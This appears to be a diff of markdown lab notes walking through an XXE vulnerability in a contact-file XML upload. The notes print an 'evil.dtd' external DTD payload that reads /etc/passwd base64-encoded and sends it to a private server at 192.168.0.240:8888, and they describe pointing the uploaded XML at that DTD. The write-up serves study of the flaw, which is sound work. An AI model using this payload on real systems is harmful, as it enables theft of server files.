@@ -3,7 +3,7 @@ Analysis of XXE lab:-  ( http://xxe2.naham.sec:8081/ )
 ![[Screenshot From 2025-03-09 14-28-04 1.png]]
 Now, this is a second example. In this case, the website allows us to upload a contact file( .xml format).
 Clicking on it provides us with an example file that we can download to see its format :-
-contacts(Lab 2).xml
+==contacts(Lab 2).xml==
 ```
 <?xml version="1.0" encoding="UTF-8"?>
 <?xml-stylesheet type="text/xsl" href="/contact.xsl"?>
@@ -44,7 +44,7 @@ This suggests that the XML is being processed in the backend, but we do not rece
 
 Now that we have confirmed the vulnerability and observed that it reaches out to our remote server using Burp Collaborator, 
 
-we will proceed with an external DTD (Document Type Definition) attack.  using this `evil.dtd` file :-
+we will proceed with an external DTD (Document Type Definition) attack.  using this ==`evil.dtd`== file :-
 ```
 <!ENTITY % data SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
 <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://192.168.0.240:8888/?x=%data;'>">
@@ -77,7 +77,7 @@ Here's what happens:
 
 Encoding the file in Base64 ensures that we capture the entire content instead of just the first few lines. This also prevents the application from breaking the content due to newline characters.
 
-Now, let's modify our `contacts.xml` file  as .`Evil_contacts(Lab2).xml`
+Now, let's modify our `contacts.xml` file  as .==`Evil_contacts(Lab2).xml`==
 ```
 <?xml version="1.0" encoding="UTF-8"?>
 
@@ -101,7 +101,7 @@ Now, let's modify our `contacts.xml` file  as .`Evil_contacts(Lab2).xml`
 </contacts>
 
 ```
-First, we replace the Burp Collaborator link with our private server's URL, which references the external DTD file.
+First, we replace the Burp Collaborator link with our private server's URL, which references the external DTD file. (http://192.168.0.240:8888/evil.dtd)
 
 Next, we define XML entities that reference the external DTD.
 
